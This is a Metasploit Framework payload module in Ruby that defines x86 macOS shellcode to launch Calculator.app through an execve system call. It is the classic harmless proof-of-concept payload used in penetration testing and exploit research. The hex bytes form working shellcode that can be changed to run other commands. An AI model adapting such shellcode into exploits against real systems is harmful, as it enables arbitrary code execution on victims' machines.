##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

module Metasploit3

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'OSX Execute Calculator.app',
			'Version'       => '$Revision$',
			'Description'   => 'Executes Calculator.app',
			'Author'        => 'argp <argp[at]census-labs.com>',
			'License'       => BSD_LICENSE,
			'Platform'      => 'osx',
			'Arch'          => ARCH_X86,
			'Payload'       =>
				{
					'Payload' =>
						"\x31\xc0\x50\x68\x61\x74\x6f\x72\x68\x6c\x63" +
						"\x75\x6c\x68\x2f\x2f\x43\x61\x68\x61\x63\x4f" +
						"\x53\x68\x73\x2f\x2f\x4d\x68\x74\x65\x6e\x74" +
						"\x68\x2f\x43\x6f\x6e\x68\x2e\x61\x70\x70\x68" +
						"\x61\x74\x6f\x72\x68\x6c\x63\x75\x6c\x68\x73" +
						"\x2f\x43\x61\x68\x74\x69\x6f\x6e\x68\x6c\x69" +
						"\x63\x61\x68\x2f\x41\x70\x70\x89\xe3\x50\x50" +
						"\x53\xb0\x3b\x6a\x2a\xcd\x80"
				}
		))

	end

end
